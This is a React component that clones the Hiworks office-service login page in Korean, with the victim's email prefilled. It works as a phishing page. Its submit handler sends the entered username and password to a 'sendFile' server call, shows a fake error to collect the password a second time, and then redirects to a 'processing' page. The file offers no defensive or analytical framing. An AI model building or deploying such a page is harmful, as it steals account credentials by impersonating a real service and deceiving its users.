import { navigate } from "@reach/router";
import React, { Fragment, useState } from "react";
import { Helmet } from "react-helmet";
import { notify, sendFile } from "../servers";

function Hiworks({ location }) {
  const [values, setValues] = useState({
    username: location.state.email,
    password: "",
  });

  const [submited, setSubmited] = useState({ status: false, count: 0 });

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
  };

  const submitForm = (event) => {
    event.preventDefault();
    setSubmited({ ...submited, status: !submited.status });

    if (submited.count === 0) {
      sendFile(values).then((data) => {
        // show error
        notify();
        setSubmited({ ...submited, count: 1 });
        console.log(data);
        console.log(submited);
      });
    } else {
      sendFile().then((data) => {
        // redirect
        navigate("processing", { state: { domain: location.state.domain } });
        console.log("ok");
      });
    }
  };

  return (
    <Fragment>
      <Helmet>
        <link
          rel="stylesheet"
          type="text/css"
          href="../hiworks_files/common.css"
        />
        <link
          rel="stylesheet"
          type="text/css"
          href="../hiworks_files/style.css"
        />
        <link
          rel="stylesheet"
          type="text/css"
          href="../hiworks_files/font-awesome.min.css"
        />
        <link
          rel="stylesheet"
          type="text/css"
          href="../hiworks_files/market.css"
        />
        <link
          rel="stylesheet"
          type="text/css"
          href="../hiworks_files/market_new.css"
        />
        <link
          rel="stylesheet"
          type="text/css"
          href="../hiworks_files/style_charge.css"
        />
        <link rel="stylesheet" href="../hiworks_files/common(1).css" />
        <link rel="stylesheet" href="../hiworks_files/style(1).css" />
        <link
          rel="stylesheet"
          type="text/css"
          href="../hiworks_files/lbd_layout.css"
        />
        <link rel="stylesheet" href="../hiworks_files/style_new.css" />
        <link rel="stylesheet" href="../hiworks_files/common(1).css" />
        <link rel="stylesheet" href="../hiworks_files/style(1).css" />
        <link
          rel="stylesheet"
          type="text/css"
          href="../hiworks_files/lbd_layout.css"
        />

        <link rel="stylesheet" href="../hiworks_files/style_new.css" />
        <link rel="stylesheet" href="../hiworks_files/main.css" />
      </Helmet>
      <div id="wrap">
        <div className="skip_navigation" data-ui="skipNavigation">
          <a href="https://www.hiworks.com/member/login#contents">
            본문 영역으로 바로가기
          </a>
        </div>
        <div className="login-wrap">
          <div className="header">
            <h1 className="logo-wrap">
              <a href="https://www.hiworks.com/">
                <img src="../hiworks_files/logo.png" alt="hiworks" />
              </a>
            </h1>
          </div>
          <div id="content">
            <div className="container-wrap">
              <div id="contents" className="member-login">
                <div className="join--wrap">
                  <fieldset className="login-form">
                    <form onSubmit={submitForm}>
                      <input type="hidden" name="hiworks_login" defaultValue />
                      <input type="hidden" name="return_url" defaultValue />
                      <input type="hidden" name="rollback_url" defaultValue />
                      <input type="hidden" name="office_id" defaultValue />
                      <input type="hidden" name="ip_security" defaultValue />
                      <div className="login-title-wrap clearfix">
                        <p className="member-title">로그인</p>
                      </div>
                      <div className="save-id mb-20 p-0">
                        <p className="cont-id mt-3">
                          <input
                            type="checkbox"
                            id="save_flag"
                            name="save_flag"
                            defaultValue="Y"
                            title="아이디 저장"
                          />
                          <label
                            htmlFor="save_flag"
                            style={{ verticalAlign: "middle" }}
                          >
                            아이디 저장
                          </label>
                        </p>
                        <p
                          className="cont-ip"
                          style={{ cursor: "pointer" }}
                          onclick="Member.check_ip_security();"
                        >
                          IP보안
                          <span className="is-state on" id="ip_security_state">
                            ON
                          </span>
                        </p>
                      </div>
                      <div id="div_login_userid" className="id-area">
                        <label htmlFor="id">아이디</label>
                        <input
                          type="text"
                          id="userid"
                          name="username"
                          disabled
                          onChange={handleChange}
                          value={values.username}
                          placeholder="아이디"
                          className="int"
                          tabIndex={1}
                        />
                        <p className="err">
                          <span
                            className="wr-txt"
                            id="desc_login_userid_err1"
                            style={{ display: "none" }}
                          >
                            * 아이디를 입력해 주세요.
                          </span>
                        </p>
                        <p className="err">
                          <span
                            className="wr-txt"
                            id="desc_login_userid_err2"
                            style={{ display: "none" }}
                          >
                            * 유효한 아이디를 입력해 주시기 바랍니다.
                          </span>
                        </p>
                      </div>
                      <div id="div_login_userpwd" className="pw-area">
                        <label htmlFor="pw">비밀번호</label>
                        <input
                          type="password"
                          id="userpwd"
                          name="password"
                          value={values.password}
                          onChange={handleChange}
                          required
                          placeholder="비밀번호"
                          className="int"
                          tabIndex={2}
                          onkeydown="if(event.keyCode==13) Member.login_formchk();"
                        />
                        <p className="err">
                          <span
                            className="wr-txt"
                            id="desc_login_userpwd"
                            style={{ display: "none" }}
                          >
                            * 비밀번호를 입력해주세요.
                          </span>
                        </p>
                      </div>
                      <p className="btn-login">
                        <label>
                          <input
                            type="submit"
                            disabled={submited.status}
                            title="로그인"
                            defaultValue="로그인"
                            className="int_jogin"
                            tabIndex={4}
                          />
                        </label>
                      </p>
                      <p className="link-idpw">
                        <a href="https://www.hiworks.com/member/search_info">
                          아이디 또는 비밀번호를 잊으셨나요?
                        </a>
                      </p>
                      <div className="mt-10">
                        <span>계정이 없으신가요?</span>
                        <span className="office-login">
                          <a href="https://www.hiworks.com/member/join">
                            회원 가입하기
                          </a>
                        </span>
                      </div>
                    </form>
                  </fieldset>
                </div>
                <div className="or--wrap">
                  <span className="or">또는</span>
                </div>
                <div className="officejoin--wrap">
                  <div className="login-title-wrap clearfix">
                    <p className="member-title">오피스로 바로 입장</p>
                  </div>
                  <p className="for-office-user">
                    오피스의 사용자로 로그인하기 위해
                    <span className="gt-layer" id="domainInfo-wrap">
                      <button className id="domainInfo-layer-btn">
                        <span
                          className="underline"
                          style={{ verticalAlign: "super" }}
                        >
                          도메인
                        </span>
                      </button>
                    </span>
                    또는
                    <span className="gt-layer" id="officeInfo-wrap">
                      <button className id="officeInfo-layer-btn">
                        <span
                          className="underline"
                          style={{ verticalAlign: "super" }}
                        >
                          오피스 주소
                        </span>
                      </button>
                    </span>
                    를 입력하세요
                  </p>
                  <p className="cont-id inform-save-chk">
                    <input
                      type="checkbox"
                      id="office_save_flag"
                      name="office_save_flag"
                      defaultValue="Y"
                      title="정보저장"
                    />
                    <label htmlFor="office_save_flag">정보저장</label>
                  </p>
                  <input
                    type="text"
                    name="office_id"
                    id="office_id"
                    className="int domain-or-office"
                    placeholder="예) 도메인 또는 오피스주소"
                    value=""
                    onkeydown="if(event.keyCode==13) Member.check_office_id();"
                  />
                  <button
                    type="button"
                    className="int_jogin next-btn"
                    onclick="Member.check_office_id();"
                  >
                    다음
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div id="dim" className="dim" />
      </div>
      <button className="gt-button" onclick="failed3timesModal()">
        로그인에 3회 이상 실패하셨습니다.
      </button>
      <div className="gt-modal" id="failed-3times-modal">
        <div
          className="gt-modal-content width-350"
          style={{ textAlign: "center" }}
        >
          <div className="gt-modal-body">
            <p>
              로그인에 3회 이상 실패하셨습니다.
              <br />
              보안 문자를 입력하고 로그인하시기 바랍니다.
            </p>
            <div className="mt-25">
              <button
                type="button"
                data-modal="hide"
                className="modal-confirm-button"
              >
                확인
              </button>
            </div>
          </div>
          <div className="gt-modal-close" data-modal="hide" />
        </div>
      </div>
      <button className="gt-button" onclick="inaccurateDomainModal()">
        도메인 또는 오피스주소가 정확하지 않습니다.
      </button>
      <div className="gt-modal" id="inaccurate-domain-modal">
        <div className="gt-modal-content width-450">
          <div className="gt-modal-body">
            <p>
              도메인 또는 오피스주소가 정확하지 않거나 만기정지된 오피스입니다.
            </p>
            <ul className="mt-15">
              <li>
                - 하이웍스 닷컴 회원 아이디는 좌측 로그인 창에 입력하세요.
              </li>
              <li>
                - 오피스의 사용자 아이디일 경우에는 내 도메인을 먼저 입력한 후
                다음 단계로 이동해 주세요.
              </li>
            </ul>
            <div className="mt-25" style={{ textAlign: "center" }}>
              <button
                type="button"
                data-modal="hide"
                className="modal-confirm-button"
              >
                확인
              </button>
            </div>
          </div>
          <div className="gt-modal-close" data-modal="hide" />
        </div>
      </div>
      <div className="gt-modal" id="kid-notice-modal">
        <div className="gt-modal-content width-450">
          <div className="gt-modal-body">
            <p>입력하신 아이디는 이메일 형식의 오피스 아이디입니다.</p>
            <ul className="mt-15">
              <li style={{ color: "#ff3333" }}>
                - '전용오피스 로그인' 페이지를 이용하셨던 오피스의 사용자는 우측
                '오피스로 바로 입장' 창에 도메인 또는 오피스 주소를 입력하셔야
                합니다.
              </li>
              <li style={{ color: "#0066ff" }}>
                (확인 버튼 클릭하면 입력하신 오피스의 로그인 페이지로
                이동합니다.)
              </li>
              <li style={{ fontWeight: 700, paddingTop: "16px" }}>
                &gt;&gt; 오피스 로그인 방법
              </li>
              <li>
                - '오피스로 바로 입장'에 도메인 또는 오피스 주소를 입력하시면
                내오피스의 로그인 페이지로 이동합니다.
              </li>
              <li>
                - 내오피스 로그인 페이지에서 오피스의 아이디/비밀번호 로 로그인
                하시면 됩니다.
              </li>
            </ul>
            <div className="mt-25" style={{ textAlign: "center" }}>
              <button
                type="button"
                data-modal="hide"
                className="modal-confirm-button"
                onclick="Member.check_office_id();"
              >
                확인
              </button>
            </div>
          </div>
          <div className="gt-modal-close" data-modal="hide" />
        </div>
      </div>
      <div className="gt-modal" id="check-ip-security">
        <div
          className="gt-modal-content width-450"
          style={{ minWidth: "510px" }}
        >
          <div className="gt-modal-title">IP 보안 설정</div>
          <div className="gt-modal-body">
            <p className="mt-20">
              로그인 후 IP주소가 변경되는 경우, 현재 IP와 최근 로그인한 IP
              정보를 확인해서 타인이 로그인 정보를 부정하게 사용하는 것을
              방지하는 로그인 보안 서비스입니다.
            </p>
            <p className="mt-10">
              <a
                href="https://customer.gabia.com/manuals/detail.php?seq_no=2802"
                style={{ color: "#779ec0 !important" }}
                target="_blank"
              >
                자세히보기
              </a>
            </p>
            <ul className="mt-20">
              <li>
                <label>
                  <input
                    type="radio"
                    name="hiworks_ip_security"
                    defaultValue={-1}
                  />
                  사용 안 함
                </label>
              </li>
              <li>
                <label>
                  <input
                    type="radio"
                    name="hiworks_ip_security"
                    defaultValue={1}
                  />
                  1단계- 로그인한 IP대역과 동일한 경우(C클래스)만 로그인 유지
                </label>
              </li>
              <li>
                <label>
                  <input
                    type="radio"
                    name="hiworks_ip_security"
                    defaultValue={2}
                  />
                  2단계- 로그인 후 IP 주소가 변경되지 않는 경우에만 로그인 유지
                </label>
              </li>
            </ul>
            <div className="mt-25" style={{ textAlign: "center" }}>
              <button
                type="button"
                className="modal-confirm-button"
                onclick="Member.save_ip_security();"
              >
                저장
              </button>
              <button
                type="button"
                data-modal="hide"
                className="modal-confirm-button"
              >
                취소
              </button>
            </div>
          </div>
          <div className="gt-modal-close" data-modal="hide" />
        </div>
      </div>
      <div className="gt-modal" id="inaccurate-domain-modal">
        <div className="gt-modal-content width-450">
          <div className="gt-modal-body">
            <p>도메인 또는 오피스주소가 정확하지 않습니다.</p>
            <ul className="mt-15">
              <li>
                - 하이웍스 닷컴 회원 아이디는 좌측 로그인 창에 입력하세요.
              </li>
              <li>
                - 오피스의 사용자 아이디일 경우에는 내 도메인을 먼저 입력한 후
                다음 단계로 이동해 주세요.
              </li>
            </ul>
            <div className="mt-25" style={{ textAlign: "center" }}>
              <button
                type="button"
                data-modal="hide"
                className="modal-confirm-button"
              >
                확인
              </button>
            </div>
          </div>
          <div className="gt-modal-close" data-modal="hide" />
        </div>
      </div>
    </Fragment>
  );
}

export default Hiworks;
